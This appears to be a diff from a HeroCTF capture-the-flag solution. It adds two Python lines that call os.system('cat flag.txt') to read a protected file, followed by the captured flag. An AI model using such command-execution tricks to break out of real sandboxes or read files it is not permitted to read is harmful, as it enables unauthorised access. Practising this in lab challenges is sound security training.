@@ -1,0 +1,3 @@
+import os 
+os.system('cat flag.txt')
+flag: HeroCTF{os_sh0uld_b3_dis4bl3d_by_4dmin}
